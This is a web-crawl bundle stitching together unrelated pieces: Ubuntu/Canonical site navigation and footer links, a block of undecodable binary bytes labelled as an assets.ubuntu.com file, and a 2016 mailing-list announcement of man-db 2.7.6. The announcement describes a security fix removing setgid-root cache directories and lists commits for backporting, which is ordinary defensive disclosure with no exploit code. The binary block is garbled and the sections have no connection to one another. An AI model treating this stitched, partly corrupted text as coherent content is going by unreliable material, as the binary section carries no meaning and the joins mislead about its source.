* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from assets.ubuntu.com_322722bc_20250126_010620.html ===
!�
  ����3\*o�?O��ɔH]���=�?=J0��� �@�j�n�|�� v��-��x؃����S�����q��?>>�Cq�<텈����%w�������q��<�8��;La2\_���v3tZ�>����nx6ۇd���p���������9�jz%{l����y���aw��Ԃ��(J4�
�D"�� [S�0��c�H�38���g��b�Ԫ����Q�60��DQ�(zs���/���,�\*�\*��lp΄)����h�����lB�h!�5�`�f-ă�&�(Vq
�p΂�BRU�iM&4M2��萅���у��zatPTvKn�^sF���d�J��j$�0&t��JM:��%�zjZ�Oq�eh�#�䤬C�[�7��H&���a�V���A�{�A?=�/�ӣ�

=== Content from lists.nongnu.org_0239923d_20250126_010621.html ===


| | **man-db-announce** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=man-db-announce)

---

[Date Prev][[Date Next](msg00001.html)][Thread Prev][[Thread Next](msg00001.html)][[Date Index](index.html#00000)][[Thread Index](threads.html#00000)]

## [Man-db-announce] man-db 2.7.6 released

---

| **From**: | Colin Watson |
| --- | --- |

| **Subject**: | [Man-db-announce] man-db 2.7.6 released |
| **Date**: | Sun, 11 Dec 2016 16:33:09 +0000 |
| **User-agent**: | Mutt/1.5.23 (2014-03-12) |

---

```
I've released man-db 2.7.6.

Description
===========

man-db contains an implementation of the man command, which is the
primary way of examining the on-line help files (manual pages).  Other
utilities provided include the whatis and apropos commands for searching
the manual page database, the manpath utility for determining the manual
page search path, and the maintenance utilities mandb, catman and
zsoelim.  The package requires a troff installation, such as groff (GNU
troff) to format and display the manual pages.

About this release
==================

Fixes:
------

* Fix build warnings with Perl 5.22.

* Document that 'man -K' searches page source, not rendered text.

* Fix a long-standing bug in man-db's internal cleanup stack mechanism:
  if a cleanup function was pushed unexpectedly between a push/pop pair,
  then popping the stack would remove the wrong cleanup function and
  chaos could ensue.  Avoid this by being more precise about which
  cleanup function should be popped.

* SECURITY: Eliminate dangerous setgid-root directories.  In the default
  configuration, cache files and directories are now owned by man:man
  rather than man:root; man and mandb are now setgid man as well as
  setuid man (except in the --disable-setuid case).  This is a much
  simpler and safer solution to the original problem that caused my
  predecessor to make directories setgid root, and doesn't introduce any
  interesting new privilege since the man group's only real purpose is
  to be the man user's primary group and nothing in cache directories is
  group-writeable.

  Maintainers of distribution packagers should take care to review their
  installation rules in light of this change.

  As far as I know this has no CVE ID, but it is described here:

    <http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/>

* Fix manual page translation infrastructure to render tables correctly
  with po4a 0.47.

Improvements:
-------------

* man now understands the <page>.<section> form on its command line, so
  for example 'man chmod.2' is now the same as 'man 2 chmod'.
  (Contributed by Mihail Konev.)

* The owner of cache files is now configured separately from whether man
  and mandb are installed setuid, using the --enable-cache-owner[=USER]
  option.

Notes for distributors
======================

The security fix above was quite involved.  If you're trying to backport
it to a stable release, then you should probably consider at least these
commits:

  e62b9edafe00c51e52863718cb2eb1e29385230e Rename some anomalous x* functions
  9ab9f3dd9b0d5f290c635995559332c1710e5b4d man(1): Fix gcc warnings
  0f8b5518949866075c25787bdc4e9c064597c21e Separate cache owner from
--enable-setuid option
  94b9d1e2a14ce8790d7c73df00d0bbd9e40cd437 Handle cleanup stack more safely
  c7f7daa9b2ffbbf4c45a2b168802a51acc2263c0 Make --disable-cache-owner imply
--disable-setuid
  31552334cecee82809059ec598a37d9ea82683f0 Eliminate dangerous setgid-root
directories
  755a9551c45da82f99d0ad8e46ef756afbeafb3f Fix distcheck following
cache-owner/setuid changes
  75701f7fd9a00108abeb851792231b3d9bc2a67d Fix systemd tmpfiles group/perms of
/var/cache/man

Feel free to contact me if you have difficulty.  You should also
consider
<http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/>,
which could not be fixed without fixing the above bug first; while this
bug was in Debian-specific cron jobs, others may have copied them.

For full details, please see the ChangeLog file in the source
distribution.

  <http://savannah.nongnu.org/projects/man-db/>
  <http://savannah.nongnu.org/download/man-db/man-db-2.7.6.tar.xz>
  <http://savannah.nongnu.org/download/man-db/man-db-2.7.6.tar.xz.sig>

Cheers,

--
Colin Watson                                       address@hidden

```

**[![Attachment:](/icons/generic.png)](pgpMkfd4omuF6.pgp)
[signature.asc](pgpMkfd4omuF6.pgp)**

*Description:* Digital signature

---

reply via email to

---

| [Prev in Thread] | **Current Thread** | [Next in Thread] |
| --- | --- | --- |

* **[Man-db-announce] man-db 2.7.6 released**,
  *Colin Watson* **<=**

---

* Next by Date:
  **[[Man-db-announce] man-db 2.7.6.1 released](msg00001.html)**
* Next by thread:
  **[[Man-db-announce] man-db 2.7.6.1 released](msg00001.html)**
* Index(es):
  + [**Date**](index.html#00000)
  + [**Thread**](threads.html#00000)


